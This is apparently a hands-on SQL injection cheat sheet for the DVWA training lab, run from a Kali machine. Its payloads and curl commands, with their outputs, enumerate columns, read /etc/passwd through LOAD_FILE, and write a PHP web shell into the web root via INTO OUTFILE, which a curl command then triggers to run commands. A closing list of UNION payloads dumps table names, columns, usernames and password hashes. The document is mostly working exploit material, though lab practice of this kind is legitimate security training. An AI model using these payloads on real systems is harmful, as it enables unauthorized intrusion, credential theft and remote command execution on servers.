SQL Column Enumeration (this can be performed at any time):

# 2 columns:
' ORDER BY 2-- -
or
http://dvwa.local/DVWA/vulnerabilities/sqli/?id=%27+ORDER+BY+2--+-&Submit=Submit#
or
┌──(kali㉿kali)-[~]
└─$ curl -I -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/sqli/?id=%27+ORDER+BY+2--+-+&Submit=Submit#"
HTTP/1.1 200 OK
Date: Mon, 26 May 2025 00:40:27 GMT
Server: Apache/2.4.63 (Debian)
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html;charset=utf-8

# 3 columns:
' ORDER BY 3-- -
or
http://dvwa.local/DVWA/vulnerabilities/sqli/?id=%27+ORDER+BY+3--+-&Submit=Submit#
or
┌──(kali㉿kali)-[~]
└─$ curl -I -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/sqli/?id=%27+ORDER+BY+3--+-+&Submit=Submit#"
HTTP/1.0 500 Internal Server Error
Date: Mon, 26 May 2025 04:23:56 GMT
Server: Apache/2.4.63 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8

* REVEALED: The table has 2 columns  (Note: If the response is "HTTP/1.1 302 Found" your PHPSESSID is likely incorrect)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
SQLi (This can be done only if the dvwa-vulnerabilities.sh script is ran first):

1. Load the /etc/passwd config file from your browser:
' UNION SELECT 1, LOAD_FILE('/etc/passwd') #
or
http://dvwa.local/DVWA/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2C+LOAD_FILE%28%27%2Fetc%2Fpasswd%27%29+%23&Submit=Submit#
or
┌──(kali㉿kali)-[~]
└─$ curl -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/sqli/?id=%27+UNION+SELECT+1%2C+LOAD_FILE%28%27%2Fetc%2Fpasswd%27%29+%23&Submit=Submit#"
<snip>
/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
tcpdump:x:102:103::/nonexistent:/usr/sbin/nologin
sshd:x:103:65534::/run/sshd:/usr/sbin/nologin
kali:x:1000:1000:,,,:/home/kali:/bin/bash
mysql:x:104:106:MariaDB Server,,,:/nonexistent:/bin/false
<snip>


2. Inject a Web Shell from the browser:
' UNION SELECT "<?php system($_GET['cmd']);?>", "<?php system($_GET['cmd']);?>" INTO OUTFILE '/var/www/html/sqlishell.php' #
or
http://dvwa.local/DVWA/vulnerabilities/sqli/?id=%27+UNION+SELECT+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%2C+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fhtml%2Fsqlishell.php%27+%23&Submit=Submit#
or
┌──(kali㉿kali)-[~]
└─$ curl -I -b "PHPSESSID=be6227281c27ad618bed6fd14894f887; security=low" "http://dvwa.local/DVWA/vulnerabilities/sqli/?id=%27+UNION+SELECT+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22%2C+%22%3C%3Fphp+system%28%24_GET%5B%27cmd%27%5D%29%3B%3F%3E%22+INTO+OUTFILE+%27%2Fvar%2Fwww%2Fhtml%2Fsqlishell.php%27+%23&Submit=Submit#"
HTTP/1.0 500 Internal Server Error
Date: Mon, 26 May 2025 06:01:05 GMT
Server: Apache/2.4.63 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8


3. Trigger the Webshell from Kali:
┌──(kali㉿kali)-[~]
└─$ curl "http://dvwa.local/sqlishell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
        uid=33(www-data) gid=33(www-data) groups=33(www-data)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Misc:

Dump all table names in the current DB:
' UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() #

List column names in users:
' UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users' #

Dump usernames & password hashes:
' UNION SELECT user, password FROM users #

Discover DB server, user, version:
' UNION SELECT 1, @@version #

Enumerate other databases:
' UNION SELECT 1, GROUP_CONCAT(schema_name) FROM information_schema.schemata #
